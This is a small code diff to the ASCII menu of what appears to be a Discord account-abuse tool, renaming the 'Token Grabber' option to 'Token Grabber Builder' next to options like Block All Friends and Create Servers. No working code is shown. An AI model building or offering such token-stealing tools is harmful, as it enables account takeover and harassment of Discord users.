@@ -30,7 +30,7 @@ ___________              .__                ________
                      ║ [6] Close DMs                 ║   ║ [15] Information              ║
                      ║ [7] Create Servers            ║   ║ [16] CREDITS                  ║
                      ║ [8] Block All Friends         ║   ║ [17] EXIT                     ║
-                     ║ [9] Token Grabber             ║   ║                               ║
+                     ║ [9] Token Grabber Builder     ║   ║                               ║
                      ╚═══════════════════════════════╝   ╚═══════════════════════════════╝
                      We recommend Option 13 and 11
 """
